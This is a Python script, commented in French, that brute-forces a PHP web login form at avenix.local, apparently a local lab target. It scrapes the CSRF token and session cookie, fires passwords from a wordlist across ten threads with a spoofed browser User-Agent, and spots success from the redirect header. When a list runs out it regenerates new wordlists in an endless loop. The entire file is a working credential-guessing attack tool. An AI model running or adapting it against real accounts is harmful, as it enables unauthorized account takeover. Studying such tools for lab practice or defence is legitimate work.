import requests
import re
import os
import subprocess
import time
from concurrent.futures import ThreadPoolExecutor

# URLs
LOGIN_URL = "http://avenix.local:9998/?action=login.submit"
LOGIN_PAGE = "http://avenix.local:9998/?page=login"

# Location (header)
FAILED_REDIRECT = "/?page=login"

# Identifiant cible
EMAIL = "EMAIL.A.MODIFIER@gmail.com"

# Fichier contenant la wordlist des mots de passe
WORDLIST_FILE = "../wordlists/passwords-v1.txt"

# Nombre de threads
THREADS = 10

# Pour simuler un vrai navigateur
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36"
}

# Générateur de mots de passe
WORDLIST_GENERATOR_SCRIPT = "../wordlists/wordlist-bruteforce-generator.py"

# Création d'une session persistante pour gérer les cookies
session = requests.Session()




def get_csrf_token():
    ''' Récupère dynamiquement le CSRF Token et le PHPSESSID une seule fois ''' 

    response = session.get(LOGIN_PAGE, headers=HEADERS, timeout=5)

    # Extraction du token CSRF avec une regex
    match = re.search(r'name="csrf_token" value="([a-f0-9]+)"', response.text)
    csrf_token = match.group(1) if match else None

    # Extraction du cookie de session
    php_session = session.cookies.get_dict().get("PHPSESSID", None)

    return csrf_token, php_session


# Récupération initiale du CSRF Token & PHPSESSID
csrf_token, php_session = get_csrf_token()
if not csrf_token or not php_session:
    print("[❌] Impossible de récupérer le CSRF Token ou PHPSESSID !")
    exit()





def try_password(password):
    ''' Tente une connexion et analyse la redirection via Location '''

    data = {
        "csrf_token": csrf_token,
        "email": EMAIL,
        "password": password.strip(),
    }

    response = session.post(LOGIN_URL, data=data, headers=HEADERS, allow_redirects=False, timeout=3)
    redirect_url = response.headers.get("Location", "").strip()

    if FAILED_REDIRECT not in redirect_url:
        elapsed_time = time.time() - START_TIME  # Calcul du temps écoulé
        print(f"\n✅ Mot de passe pour {EMAIL} : {password.strip()}")
        print(f"Temps total écoulé : {elapsed_time:.2f} secondes")
        return True
    return False





def generate_wordlist():
    ''' Appelle le script générateur de mots de passe pour ajouter une nouvelle liste '''

    print("🔄 Génération d'une nouvelle liste de mots de passe...")
    subprocess.run(["python3", WORDLIST_GENERATOR_SCRIPT])





def brute_force(passwords):
    ''' Exécute le bruteforce en parallèle avec ThreadPoolExecutor '''
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        results = executor.map(try_password, passwords)

    # Si un mot de passe fonctionne, on arrête tout
    return any(results)





def main():
    global START_TIME
    START_TIME = time.time()  # Démarrage du chronomètre

    # Vérifier si le fichier wordlist existe
    if not os.path.exists(WORDLIST_FILE):
        print("⚠️ Aucune wordlist trouvée, génération d'une nouvelle liste...")
        generate_wordlist()

    while True:
        with open(WORDLIST_FILE, "r", encoding="utf-8") as f:
            passwords = [line.strip() for line in f.readlines()]  # Chargement optimisé

        print(f"⌛ Chargement de {len(passwords)} mots de passe pour le bruteforce...")
        
        if brute_force(passwords):
            return  # Arrête immédiatement si un mot de passe est trouvé (ne fonctionne pas terrible...)

        print("⚠️ Aucun mot de passe trouvé, génération d'une nouvelle liste...")
        generate_wordlist()

if __name__ == "__main__":
    main()
